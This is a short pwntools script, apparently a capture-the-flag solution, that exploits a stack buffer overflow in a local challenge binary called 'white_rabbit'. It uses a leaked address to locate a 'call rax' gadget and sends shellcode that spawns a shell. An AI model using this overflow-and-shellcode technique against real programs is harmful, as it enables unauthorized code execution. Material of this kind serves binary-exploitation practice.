from pwn import *

exe = ELF("./white_rabbit", checksec=False)
context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")
sh = asm(shellcraft.sh())

p = process('./white_rabbit')
p.recvuntil(b'  / > ')
main = int(p.recvline().decode(),16)
call_rax = main - 0x1180 + 0x1014
print(f'{hex(main) = }')
print(f'{hex(call_rax) = }')

p.recvuntil(b'follow the white rabbit...\n')
pause()
p.sendline(sh + b'A'*(112-len(sh)) + b'B'*8 + p64(call_rax))
p.interactive()